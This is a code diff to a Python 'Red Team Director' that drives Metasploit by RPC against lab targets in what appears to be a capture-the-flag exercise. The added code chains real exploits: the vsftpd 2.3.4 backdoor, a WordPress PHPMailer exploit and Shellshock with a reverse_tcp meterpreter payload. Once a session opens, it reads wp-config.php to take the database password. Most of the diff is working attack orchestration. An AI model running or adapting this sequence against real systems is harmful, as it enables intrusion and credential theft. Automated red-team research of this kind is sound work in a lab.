@@ -3,17 +3,19 @@
 Red Team Director
 """
 
-import os
+import sys
 from time import sleep
+import json
 
 from .workers import MsfRpcWorker
 from .actions import ExecuteExploitAction
+from .actions import ExecuteSessionCommandAction
 from .errors import ActionExecutionError
 
 
 # _appconfig = None
 # _msfrpc_hosts = None
-# _log_director = _appconf
+# _log_director = None
 _workers = {}
 _exit = False
 
@@ -63,32 +65,53 @@ def loop():
 
 
 def plan_next_action(worker):
-    return {'type': 'noop'}
+    vsftpd_exploit = ExecuteExploitAction(
+        'unix/ftp/vsftpd_234_backdoor',
+        'cmd/unix/interact',
+        {
+            'RHOSTS': 'target3',
+            'VERBOSE': True,
+        }
+    )
+    wordpress_exploit = ExecuteExploitAction(
+        'unix/webapp/wp_phpmailer_host_header',
+        None,
+        {
+            'RHOSTS': 'wordpress',
+            'LHOST': 'msfrpc',
+            'VERBOSE': True,
+        }
+    )
+    wordpress_exfiltrate = ExecuteSessionCommandAction(
+        'cat /var/www/html/wp-config.php'
+    )
+    shellshock_exploit = ExecuteExploitAction(
+        'multi/http/apache_mod_cgi_bash_env_exec',
+        'linux/x86/meterpreter/reverse_tcp',
+        {
+            'RHOSTS': 'target2',
+            'TARGETURI': '/cgi-bin/stats',
+            'VERBOSE': True,
+            'LHOST': 'msfrpc',
+        }
+    )
+    flag = _appconfig.targets['wordpress_db_password']
+    if flag['flag_value']:
+        _log_director(f'The flag has been captured')
+        _log_director(json.dumps(flag))
+        sys.exit(0)
+    if worker.client().sessions.list:
+        return wordpress_exfiltrate
+    return wordpress_exploit
+    
 
 
 def execute_action(worker, action):
-    _log_director.info('Executing')
+    _log_director.info('\n\nExecuting action...')
     try:
-        exploit_action = ExecuteExploitAction(
-            'unix/ftp/vsftpd_234_backdoor',
-            'cmd/unix/interact',
-            {
-                'RHOSTS': 'target3',
-                'VERBOSE': True,
-            }
-        )
-        exploit_action.execute(worker.client())
+        action.execute(worker)
     except ActionExecutionError:
         _log_director.warning('Failed to execute exploit action')
-# result = run_exploit(
-#     'multi/http/apache_mod_cgi_bash_env_exec',
-#     'linux/x86/meterpreter/reverse_tcp',
-#     {
-#         'RHOSTS': 'target2',
-#         'TARGETURI': '/cgi-bin/stats',
-#         'VERBOSE': True,
-#     }
-# )
 
 
 def report(worker):
